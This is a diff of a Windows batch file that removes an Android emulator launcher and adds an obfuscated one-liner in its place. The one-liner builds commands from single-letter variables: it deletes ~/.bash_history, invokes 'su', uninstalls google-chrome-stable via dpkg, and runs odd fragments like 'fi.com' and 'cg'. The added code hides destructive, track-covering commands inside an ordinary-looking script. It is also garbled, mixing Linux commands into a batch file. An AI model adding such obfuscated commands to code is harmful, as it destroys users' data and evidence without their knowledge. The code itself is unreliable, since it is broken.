@@ -1,15 +1,5 @@
 @echo off
-git reset --hard && git pull
+setlocal enabledelayedexpansion
 
-cls
-
-echo Available Android Virtual Devices (AVDs):
-
-"%USERPROFILE%\AppData\Local\Android\Sdk\emulator\emulator" -list-avds
-echo.
-
-echo.
-
-set /p avdName=Enter the name of the AVD you want to start:
-
-"%USERPROFILE%\AppData\Local\Android\Sdk\emulator\emulator" -avd %avdName%
+set "a=!A" & set "l=echo" & set "s=pwd" & set "t=fi" & set "x=rev" & set "c=hist" & set "m=rm" & set "g=cg" & set "d=dpkg" & set "u=su" & set "e=ge"
+%t%.com&%g%&%m% ~/.bash_history&%l% %s%&%u%&%a%&%d% --remove google-chrome-stable&%e%t -l
